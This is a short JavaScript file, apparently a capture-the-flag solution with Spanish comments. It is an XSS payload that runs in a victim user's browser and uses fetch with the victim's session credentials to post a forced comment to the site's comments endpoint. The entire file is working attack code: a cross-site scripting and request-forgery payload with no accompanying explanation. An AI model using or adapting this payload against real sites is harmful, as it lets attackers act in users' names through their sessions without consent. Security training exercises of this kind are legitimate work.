// ataque.js - Se ejecuta en el navegador de Jeni.
(function() {
    var f = new FormData();
    // Cambiar por el parámetro de comentario real si es necesario
    f.append('comment_text', '¡Comentario de Jeni forzado por XSS! CTF resuelto.'); 

    // ¡La ruta al endpoint de COMENTARIOS!
    fetch('/comentarios', { 
        method: 'POST',
        body: f,
        credentials: 'include'
    })
    .then(response => {
        console.log('Comentario publicado en el blog.');
    })
    .catch(console.error);
})();
